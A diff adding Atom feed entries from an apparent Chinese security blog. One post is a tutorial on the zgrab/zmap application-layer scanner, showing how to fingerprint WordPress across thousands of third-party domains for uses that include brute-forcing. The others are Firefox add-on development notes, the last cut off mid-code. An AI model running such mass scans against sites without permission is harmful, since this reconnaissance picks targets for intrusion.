+  <entry>
+    <title>基于zmap 的应用层扫描器 zgrab (一)</title>
+    <link href="yaseng.org/application-layer-scanner-with-zmap-zgrab-1.html"/>
+    <id>yaseng.org/application-layer-scanner-with-zmap-zgrab-1.html</id>
+    <published>2015-12-27T10:18:30.000Z</published>
+    <updated>2016-09-01T13:27:52.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>zgrab 是基于zmap无状态扫描的应用层扫描器,可以自定义数据包,以及ip,domain之间的关联。可用于快速指纹识别爆破等场景。</p>
+<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>首先需要安装go lang 环境<br>然后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">go get github.com/zmap/zgrab</span><br><span class="line">cd $GOPATH/src/github.com/zmap/zgrab</span><br><span class="line">go build</span><br></pre></td></tr></table></figure>
+<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>zgrab -help<br>参数    注释    示范<br>port    端口    –port 80<br>data    发送数据包并且返回响应    –data http-req-domain<br><a id="more"></a></p>
+<h4 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h4><h5 id="zmap-扫描结果"><a href="#zmap-扫描结果" class="headerlink" title="zmap 扫描结果"></a>zmap 扫描结果</h5><p>输入流可以使用zmap 的扫描结果,例如项目主页的例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zmap -p 443 --output-fields=* | ztee results.csv | zgrab --port 443 --tls --data=./http-req --output-file=banners.json</span><br></pre></td></tr></table></figure></p>
+<p>其中 http-req 为自定义的数据包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@pw_node_1 zgrab]# cat  http-req</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: %s</span><br></pre></td></tr></table></figure></p>
+<h5 id="域名列表"><a href="#域名列表" class="headerlink" title="域名列表"></a>域名列表</h5><p>ip,domain  的文件,例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@pw_node_1 zgrab]# cat  2.csv</span><br><span class="line">36.51.255.148,tinyjun.com</span><br><span class="line">36.51.255.148,i6618.com</span><br><span class="line">36.51.255.148,www.linwen.com</span><br><span class="line">36.51.255.148,lujunda.cn</span><br><span class="line">36.51.255.148,haohaomai.com</span><br><span class="line">36.51.255.148,it1208.com</span><br><span class="line">36.51.255.148,www.lijinmao.com</span><br><span class="line">36.51.255.148,lushao.cn</span><br><span class="line">36.51.255.148,i6618.com</span><br><span class="line">36.51.255.148,www.it-case.com</span><br><span class="line">36.51.255.148,zhihub.com</span><br><span class="line">36.51.255.148,wwww.yaseng.org</span><br></pre></td></tr></table></figure></p>
+<p>cat 2.csv  |   ./zgrab  –port  80  –data  http-req-domain</p>
+<h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h4><p>默认输出为json ,可以使用jq 工具解析</p>
+<h4 id="示范"><a href="#示范" class="headerlink" title="示范"></a>示范</h4><p>扫描 127.0.0.1,localhost<br>效果如图<br><a href="/uploads/2015/12/zgrab_1_1.jpg"><img src="/uploads/2015/12/zgrab_1_1-300x135.jpg" alt="" title="zgrab_1_1"></a></p>
+<p>命令行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[root@pw_node_1 zgrab]# cat  3.csv</span><br><span class="line">127.0.0.1,localhost</span><br><span class="line">[root@pw_node_1 zgrab]# cat  /tmp/3.csv  |   ./zgrab  --port  80  --data  http-req-domain  |  jq  &quot;.&quot;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;data&quot;: &#123;</span><br><span class="line">    &quot;write&quot;: &quot;GET / HTTP/1.1\r\nHost: localhost\r\n\r\n&quot;,</span><br><span class="line">    &quot;read&quot;: &quot;HTTP/1.1 200 OK\r\nDate: Sun, 27 Dec 2015 17:33:43 GMT\r\nServer: Apache/2.2.15 (CentOS)\r\nLast-Modified: Fri, 11 Dec 2015 14:51:21 GMT\r\nETag: \&quot;82db1-e-526a074ea5571\&quot;\r\nAccept-Ranges: bytes\r\nContent-Length: 14\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\nhello  yaseng\n&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;timestamp&quot;: &quot;2015-12-28T01:33:43+08:00&quot;,</span><br><span class="line">  &quot;domain&quot;: &quot;localhost&quot;,</span><br><span class="line">  &quot;ip&quot;: &quot;127.0.0.1&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;sni_support&quot;: true,</span><br><span class="line">  &quot;ca_file_name&quot;: null,</span><br><span class="line">  &quot;mail_type&quot;: null,</span><br><span class="line">  &quot;tls_version&quot;: null,</span><br><span class="line">  &quot;timeout&quot;: 10,</span><br><span class="line">  &quot;port&quot;: 80,</span><br><span class="line">  &quot;success_count&quot;: 1,</span><br><span class="line">  &quot;failure_count&quot;: 0,</span><br><span class="line">  &quot;total&quot;: 1,</span><br><span class="line">  &quot;start_time&quot;: &quot;2015-12-28T01:33:43+08:00&quot;,</span><br><span class="line">  &quot;end_time&quot;: &quot;2015-12-28T01:33:43+08:00&quot;,</span><br><span class="line">  &quot;duration&quot;: 0,</span><br><span class="line">  &quot;senders&quot;: 1000</span><br><span class="line">&#125;</span><br><span class="line">[root@pw_node_1 zgrab]# curl  localhost</span><br><span class="line">hello  yaseng</span><br><span class="line">[root@pw_node_1 zgrab]#</span><br></pre></td></tr></table></figure></p>
+<h4 id="自定义数据包"><a href="#自定义数据包" class="headerlink" title="自定义数据包"></a>自定义数据包</h4><p>可以自定义http 数据包,例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@pw_node_1 zgrab]# cat   http-req-domain</span><br><span class="line">GET /1.php HTTP/1.1</span><br><span class="line">Host: %d</span><br></pre></td></tr></table></figure></p>
+<h3 id="实例-快速指纹识别"><a href="#实例-快速指纹识别" class="headerlink" title="实例:快速指纹识别"></a>实例:快速指纹识别</h3><p>例如需要在一大批域名列表里面快速识别wordpress,并且输出域名。<br>首先从header 里面找出wp 的指纹以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@pw_node_1 zgrab]# curl  -I  yaseng.org</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.2.6</span><br><span class="line">Date: Sun, 27 Dec 2015 17:59:25 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line">Pragma: no-cache</span><br><span class="line">X-Pingback: http://yaseng.org/xmlrpc.php</span><br><span class="line">Via: 10.17.21.22</span><br><span class="line">Set-Cookie: saeut=11111151239164757346; path=/; max-age=311040000</span><br><span class="line">Set-Cookie: PHPSESSID=86483bb31b614b6f5a9513854a27e321; path=/; HttpOnly</span><br></pre></td></tr></table></figure></p>
+<p>使用 字符串   X-Pingback 来做识别指纹<br>识别命令为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat domain.log     |  ./zgrab  --port  80  --data  http-req-domain   | grep   &apos;X-Pingback&apos;  |   jq  &apos;.domain&apos; |    awk -F &apos;&quot;&apos;  &apos;&#123;print $2&#125;&apos;</span><br></pre></td></tr></table></figure></p>
+<p>其中  domain.log   为 1w ip 到域名 ip,domain 映射<br>分分钟即可识别完,示范如图<br><a href="/uploads/2015/12/zgrab_1_2.jpg"><img src="/uploads/2015/12/zgrab_1_2-300x106.jpg" alt="" title="zgrab_1_2"></a></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/zmap/zgrab" target="_blank" rel="external">https://github.com/zmap/zgrab</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h3&gt;&lt;p&gt;zgrab 是基于zmap无状态扫描的应用层扫描器,可以自定义数据包,以及ip,domain之间的关联。可用于快速指纹识别爆破等场景。&lt;/p&gt;
+&lt;h3 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h3&gt;&lt;p&gt;首先需要安装go lang 环境&lt;br&gt;然后&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;go get github.com/zmap/zgrab&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cd $GOPATH/src/github.com/zmap/zgrab&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;go build&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&quot;使用&quot;&gt;&lt;a href=&quot;#使用&quot; class=&quot;headerlink&quot; title=&quot;使用&quot;&gt;&lt;/a&gt;使用&lt;/h3&gt;&lt;h4 id=&quot;参数&quot;&gt;&lt;a href=&quot;#参数&quot; class=&quot;headerlink&quot; title=&quot;参数&quot;&gt;&lt;/a&gt;参数&lt;/h4&gt;&lt;p&gt;zgrab -help&lt;br&gt;参数    注释    示范&lt;br&gt;port    端口    –port 80&lt;br&gt;data    发送数据包并且返回响应    –data http-req-domain&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Hack" scheme="yaseng.org/categories/Hack/"/>
+    
+      <category term="神器共享" scheme="yaseng.org/categories/Hack/%E7%A5%9E%E5%99%A8%E5%85%B1%E4%BA%AB/"/>
+    
+    
+      <category term="zgrab" scheme="yaseng.org/tags/zgrab/"/>
+    
+      <category term="zmap" scheme="yaseng.org/tags/zmap/"/>
+    
+      <category term="无状态扫描" scheme="yaseng.org/tags/%E6%97%A0%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>firefox 扩展开发笔记（二）:进阶开发之移动设备模拟</title>
+    <link href="yaseng.org/firefox-addon-mobile-device-toggle.html"/>
+    <id>yaseng.org/firefox-addon-mobile-device-toggle.html</id>
+    <published>2015-11-28T01:53:10.000Z</published>
+    <updated>2016-09-01T13:27:52.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>上篇文章记录了的使用jpm 简单的开发一个demo 以及调试过程,但是实际开发中要复杂的多,本文以<br>一个实际的例子来记录如何进阶开发。</p>
+<h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><p>为了方便于开发移动web端网页，参考chrome模拟手机浏览器功能，在火狐浏览器中，以相对简便方<br>式，实现pc端直接访问移动web端，给移动web网页开发调试工作提高便捷。<br>第一 需要响应点击按钮事件,并且得到当前的动态<br>第二 需要设置浏览器的use-agent<br><a id="more"></a></p>
+<h3 id="资料查阅"><a href="#资料查阅" class="headerlink" title="资料查阅"></a>资料查阅</h3><h4 id="切换按钮"><a href="#切换按钮" class="headerlink" title="切换按钮"></a>切换按钮</h4><p>需要一个能切换的按钮,去官方文档找ui界面的资料<br><a href="https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/ui" title="https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/ui" target="_blank" rel="external">https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/ui</a><br>找到一个符合要求的sdk  ui/button/toggle<br>地址为  :<a href="https://developer.mozilla.org/en-US/Add-ons/SDK/Low-Level_APIs/ui_button_toggle" title="https://developer.mozilla.org/en-US/Add-ons/SDK/Low-Level_APIs/ui_button_toggle" target="_blank" rel="external">https://developer.mozilla.org/en-US/Add-ons/SDK/Low-Level_APIs/ui_button_toggle</a><br>示范代码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> &#123; ToggleButton &#125; = <span class="built_in">require</span>(<span class="string">"sdk/ui/button/toggle"</span>);</span><br><span class="line"><span class="keyword">var</span> button = ToggleButton(&#123;</span><br><span class="line">  id: <span class="string">"Mobile-toggle"</span>,</span><br><span class="line">  label: <span class="string">"Toggle mobile mode"</span>,</span><br><span class="line">    icon: &#123;</span><br><span class="line">    <span class="string">"16"</span>: <span class="string">"./icon-16.png"</span>,</span><br><span class="line">    <span class="string">"32"</span>: <span class="string">"./icon-32.png"</span>,</span><br><span class="line">    <span class="string">"64"</span>: <span class="string">"./icon-64.png"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    onChange: handleClick </span><br><span class="line">  &#125;);</span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">handleClick</span>(<span class="params">state</span>) </span>&#123;</span><br><span class="line">      <span class="comment">//state.checked  是否选中</span></span><br><span class="line">      <span class="built_in">console</span>.log(state.label + <span class="string">" checked state: "</span> + state.checked);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h4 id="设置user-agent"><a href="#设置user-agent" class="headerlink" title="设置user-agent"></a>设置user-agent</h4><p>比较起ui来说查找相关资料要麻烦点。<br>有三个途径<br>第一:找类似的插件,查看源码。<br>第二:去官方文档搜索  user-agent 等关键词<br>第三:去Firefox 的高级配置页面 about:config 找到ua 的键值<br>综合以上三个方案找到设置firefox  user-agent<br>属于 API sdk/preferences/service  键值  general.useragent.override<br>如图所示<br><a href="/uploads/2015/11/firefox_2_2.jpg"><img src="/uploads/2015/11/firefox_2_2-300x105.jpg" alt="" title="firefox_2_2"></a><br>测试代码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> prefs = <span class="built_in">require</span>(<span class="string">"sdk/preferences/service"</span>);</span><br><span class="line"><span class="keyword">var</span> key = <span class="string">"general.useragent.override"</span>;</span><br><span class="line">prefs.set(key,<span class="string">'Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4'</span>)</span><br><span class="line"><span class="built_in">console</span>.log(prefs.get(key));</span><br></pre></td></tr></table></figure></p>
+<h3 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h3><h4 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h4><p>使用 jpm  init 向导,注意 生成 package.json 里面<br>还有一些配置没有写进去,比如图标,主页,id 等。<br>具体参考页面  <a href="https://developer.mozilla.org/en-US/Add-ons/SDK/Tools/package_json" target="_blank" rel="external">https://developer.mozilla.org/en-US/Add-ons/SDK/Tools/package_json</a><br>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;title&quot;: &quot;device mode toggle&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;devicemodetoggle&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;1.0.0&quot;,</span><br><span class="line">  &quot;description&quot;: &quot;a simple device mode toggle  tool&quot;,</span><br><span class="line">  &quot;main&quot;: &quot;index.js&quot;,</span><br><span class="line">  &quot;author&quot;: &quot;yaseng@uauc.net&quot;,</span><br><span class="line">  &quot;homepage&quot; : &quot;http://www.yaseng.org&quot;,</span><br><span class="line">  &quot;icon&quot;: &quot;resource://@devicemodetoggle/data/icon-48.png&quot;,</span><br><span class="line">  &quot;engines&quot;: &#123;</span><br><span class="line">    &quot;firefox&quot;: &quot;&gt;=38.0a1&quot;,</span><br><span class="line">    &quot;fennec&quot;: &quot;&gt;=38.0a1&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;license&quot;: &quot;MIT&quot;,</span><br><span class="line">  &quot;keywords&quot;: [</span><br><span class="line">    &quot;jetpack&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>附加组件页面的样式图<br><a href="/uploads/2015/11/firefox-2-4.jpg"><img src="/uploads/2015/11/firefox-2-4-300x169.jpg" alt="" title="firefox-2-4"></a></p>
+<h4 id="index-js"><a href="#index-js" class="headerlink" title="index.js"></a>index.js</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span><br><span class="line">*@name      index.js</span><br><span class="line">*@desc      a simple device mode toggle  tool</span><br><span class="line">*@author    yaseng@uauc.net </span><br><span class="line">**/</span></span><br><span class="line"><span class="keyword">var</span> &#123; ToggleButton &#125; = <span class="built_in">require</span>(<span class="string">"sdk/ui/button/toggle"</span>);</span><br><span class="line"><span class="keyword">var</span> prefs = <span class="built_in">require</span>(<span class="string">"sdk/preferences/service"</span>);</span><br><span class="line"><span class="keyword">var</span> key = <span class="string">"general.useragent.override"</span>;</span><br><span class="line"><span class="keyword">var</span> button = ToggleButton(&#123;</span><br><span class="line">  id: <span class="string">"Mobile-toggle"</span>,</span><br><span class="line">  label: <span class="string">"Toggle mobile mode"</span>,</span><br><span class="line">    icon: &#123;</span><br><span class="line">    <span class="string">"16"</span>: <span class="string">"./icon-16.png"</span>,</span><br><span class="line">    <span class="string">"32"</span>: <span class="string">"./icon-32.png"</span>,</span><br><span class="line">    <span class="string">"64"</span>: <span class="string">"./icon-64.png"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    onChange: handleClick </span><br><span class="line">  &#125;);</span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">handleClick</span>(<span class="params">state</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span>  mobile_user_agent=<span class="string">'Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4'</span>;</span><br><span class="line">      <span class="keyword">if</span> (state.checked)&#123;</span><br><span class="line">      	prefs.set(key,mobile_user_agent);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        prefs.reset(key);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>如图所示 thinksns 的 wap端页面调试<br><a href="/uploads/2015/11/firefox-2-3.jpg"><img src="/uploads/2015/11/firefox-2-3-200x300.jpg" alt="" title="firefox-2-3"></a></p>
+<h3 id="源码下载"><a href="#源码下载" class="headerlink" title="源码下载"></a>源码下载</h3><p>github   <a href="https://github.com/yaseng/pentest/tree/master/project/device_mode_toggle" title="https://github.com/yaseng/pentest/tree/master/project/device_mode_toggle" target="_blank" rel="external">https://github.com/yaseng/pentest/tree/master/project/device_mode_toggle</a></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>1:useragent  API      <a href="https://developer.mozilla.org/en-US/docs/Web/API/NavigatorID/userAgent" target="_blank" rel="external">https://developer.mozilla.org/en-US/docs/Web/API/NavigatorID/userAgent</a><br>2:package.json         <a href="https://developer.mozilla.org/en-US/Add-ons/SDK/Tools/package_json" target="_blank" rel="external">https://developer.mozilla.org/en-US/Add-ons/SDK/Tools/package_json</a><br>3:jpm icon  issue       <a href="https://github.com/mozilla-jetpack/jpm/issues/197" target="_blank" rel="external">https://github.com/mozilla-jetpack/jpm/issues/197</a><br>4:ui  button  toggle    <a href="https://developer.mozilla.org/en-US/Add-ons/SDK/Low-Level_APIs/ui_button_toggle" target="_blank" rel="external">https://developer.mozilla.org/en-US/Add-ons/SDK/Low-Level_APIs/ui_button_toggle</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;上篇文章记录了的使用jpm 简单的开发一个demo 以及调试过程,但是实际开发中要复杂的多,本文以&lt;br&gt;一个实际的例子来记录如何进阶开发。&lt;/p&gt;
+&lt;h3 id=&quot;需求&quot;&gt;&lt;a href=&quot;#需求&quot; class=&quot;headerlink&quot; title=&quot;需求&quot;&gt;&lt;/a&gt;需求&lt;/h3&gt;&lt;p&gt;为了方便于开发移动web端网页，参考chrome模拟手机浏览器功能，在火狐浏览器中，以相对简便方&lt;br&gt;式，实现pc端直接访问移动web端，给移动web网页开发调试工作提高便捷。&lt;br&gt;第一 需要响应点击按钮事件,并且得到当前的动态&lt;br&gt;第二 需要设置浏览器的use-agent&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Firefox" scheme="yaseng.org/categories/Firefox/"/>
+    
+      <category term="西部大开发" scheme="yaseng.org/categories/Firefox/%E8%A5%BF%E9%83%A8%E5%A4%A7%E5%BC%80%E5%8F%91/"/>
+    
+    
+      <category term="firefox 扩展开发笔记" scheme="yaseng.org/tags/firefox-%E6%89%A9%E5%B1%95%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="firefox 插件" scheme="yaseng.org/tags/firefox-%E6%8F%92%E4%BB%B6/"/>
+    
+      <category term="firefox扩展" scheme="yaseng.org/tags/firefox%E6%89%A9%E5%B1%95/"/>
+    
+      <category term="firefox 进阶开发" scheme="yaseng.org/tags/firefox-%E8%BF%9B%E9%98%B6%E5%BC%80%E5%8F%91/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>firefox 扩展开发笔记（一）:jpm 使用实践以及调试</title>
+    <link href="yaseng.org/firefox-addon-development-notes-with-jpm.html"/>
+    <id>yaseng.org/firefox-addon-development-notes-with-jpm.html</id>
+    <published>2015-11-27T07:45:35.000Z</published>
+    <updated>2016-09-01T13:27:52.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>&nbsp;&nbsp;火狐作为知名开源的浏览器，虽然用户量大，开发者众多，然而国内现有的有关扩展组件开发可供利用的资料却乏善<br>可陈，以前迫于时间关系，在开发火狐扩展的项目中，大都实行拿来主义，借鉴现有的插件，其中眉目关系不求甚解，近<br>来在开发某个插件的过程中，遇到了多环境不兼容的问题，彻夜调试不得其解，终痛下决心，颇费心力以研究有关火狐开<br>发的相关思路和开发模式，特把相关心得以表如下，抓耳挠腮之作，权为投石问路，望诸君不吝赐教。<br>&nbsp;&nbsp;过往对于火狐开发的认知几许迷惶，火狐官方对于开发文档和开发环境IDE的规范化相当混乱，颇有朝令夕改之态势，<br>诸如开发工具从最初的手工打包到Web 的ide到Python 的cfx ，转而又到现在最新的基于node.js的jpm(firefox&gt;= 38)，此<br>点当为大多数火狐开发爱好者的掣肘,鉴于此，本文以最新的火狐jpm开发工具为例，详述了相关环境以及项目实现的流程<br>和思路。<br><a id="more"></a></p>
+<h3 id="jpm-使用"><a href="#jpm-使用" class="headerlink" title="jpm 使用"></a>jpm 使用</h3><p>安装好  node.js 环境之后,使用npm 安装。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/mozilla-jetpack/jpm.git</span><br><span class="line">cd jpm</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure></p>
+<p>几个重要的命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docs             打开官方文档页面</span><br><span class="line">xpi              打包为xpi文件</span><br><span class="line">test             测试项目</span><br><span class="line">init             初始化项目,写入配置</span><br><span class="line">run              在一个干净的firefox 里面运行当前项目</span><br></pre></td></tr></table></figure></p>
+<p>具体详细参考官方文档  <a href="https://developer.mozilla.org/en-US/Add-ons/SDK/Tools/jpm" title=" https://developer.mozilla.org/en-US/Add-ons/SDK/Tools/jpm" target="_blank" rel="external"> https://developer.mozilla.org/en-US/Add-ons/SDK/Tools/jpm</a></p>
+<h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><p>根据官方实例<br>新建插件文件夹并且初始化<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdirya-addon</span><br><span class="line">cd ya-addon</span><br><span class="line">jpm init</span><br></pre></td></tr></table></figure></p>
+<p>填写一些插件的配置,如下图<br><a href="/uploads/2015/11/1.jpg"><img src="/uploads/2015/11/1-300x214.jpg" alt="" title="1"></a><br>入口文件index.js 开始编写代码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span><br><span class="line">*@name      index.js</span><br><span class="line">*@desc      firefox add-on  demo </span><br><span class="line">*@author    yaseng@uauc.net </span><br><span class="line">**/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ui api 参考    https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/ui</span></span><br><span class="line"><span class="keyword">var</span> buttons = <span class="built_in">require</span>(<span class="string">'sdk/ui/button/action'</span>); </span><br><span class="line"><span class="comment">//tab api 参考  